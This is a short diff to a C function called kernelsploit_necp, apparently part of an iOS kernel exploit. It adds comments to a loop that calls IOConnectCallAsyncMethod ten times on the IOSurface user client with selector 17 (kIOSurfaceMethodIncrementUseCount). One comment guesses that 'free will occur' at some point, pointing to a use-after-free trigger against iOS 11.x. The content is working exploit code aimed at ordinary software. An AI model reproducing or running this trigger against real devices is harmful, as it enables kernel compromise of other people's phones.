@@ -402,8 +402,8 @@ mach_port_t kernelsploit_necp() {
     
     for (int i = 0; i < 10; i++) {
         err = IOConnectCallAsyncMethod(
-                                       user_client,
-                                       17,
+                                       user_client, //IOCoreSurfaceRoot on iOS 11.2 - 11.3.1, below 11.2: IOSurfaceRoot.
+                                       17, //kIOSurfaceMethodIncrementUseCount
                                        port,
                                        reference,
                                        referenceCnt,
@@ -415,8 +415,8 @@ mach_port_t kernelsploit_necp() {
                                        &outputScalarCnt,
                                        outputStruct,
                                        &outputStructCnt);
-        
-        printf("Call %d: %s\n",i , mach_error_string(err));
+         
+        printf("Call %d: %s\n",i , mach_error_string(err)); //at some point free will occur I think?
     
     };
     
